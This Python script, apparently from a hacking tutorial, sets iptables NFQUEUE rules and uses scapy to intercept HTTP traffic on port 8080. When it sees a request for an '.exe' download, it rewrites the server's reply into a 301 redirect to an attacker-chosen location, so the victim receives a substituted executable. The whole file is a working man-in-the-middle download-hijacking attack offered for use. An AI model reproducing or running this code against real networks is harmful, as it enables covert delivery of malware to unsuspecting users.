#!/usr/bin/env python

# iptables -I FORWARD -j NFQUEUE --queue-num 0      run this to store packets in a queue for remote machine

# iptables -I OUTPUT -j NFQUEUE --queue-num 0      run this to store packets in a queue for local machine
# iptables -I INPUT -j NFQUEUE --queue-num 0      run this to store packets in a queue for local machine

# pip install netfilterqueue
# after flush the iptables :- iptables --flush
import netfilterqueue
import subprocess
import scapy.all as scapy

ack_list = []

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        # for better cap use port as 8080
        if scapy_packet[scapy.TCP].dport == 8080:
            if ".exe" in scapy_packet[scapy.Raw].load and "192.168.175.138" not in scapy_packet[scapy.Raw].load:  #edit accordingly
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 8080:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] replacing download")
                # edit the location
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp\n\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))
    packet.accept()



try:
    subprocess.call("iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call("iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0,process_packet)
    queue.run()
except KeyboardInterrupt:
    print("[+] deleting ip tables")
    subprocess.call("iptables --flush", shell=True)
